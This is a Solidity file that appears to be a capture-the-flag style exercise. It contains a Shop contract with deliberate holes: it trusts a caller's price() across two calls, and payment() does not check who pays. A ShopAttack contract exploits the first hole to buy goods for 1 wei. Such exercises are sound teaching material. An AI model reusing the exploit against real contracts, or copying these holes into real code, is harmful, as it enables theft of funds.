// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//添加逻辑：商品由合约拥有者发售，用户需竞价，最先出价满足合约商品价格要求的竞价完成后，竞价者向合约拥有者支付price以获得商品所有权
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {

  uint public price = 1e18;
  bool public isBided;
  bool public isSold;
  address public goodsOwner;

  address public contractOwner;

  constructor() {
    contractOwner = msg.sender;
  }

  modifier onlyOwner  {
    require(msg.sender == contractOwner, "only the owner of contarct can invoke!");
    _;
  }

  function bidding() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      goodsOwner = msg.sender;
      isBided = true;
      price = _buyer.price();
    }
  }

  function payment() public payable{
    require(msg.value == price, "you must pay the same peice as you bid!");
    isSold = true;
  }

  function withdraw() public onlyOwner {
    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
    require(sent, "failed to withdraw!");
  }
}

contract ShopAttack {
  function price() external view returns (uint) {
    return Shop(msg.sender).isBided() ? 1 : 1e18;
  }

  function attack(Shop _victim) external {
    Shop(_victim).bidding();
  }
}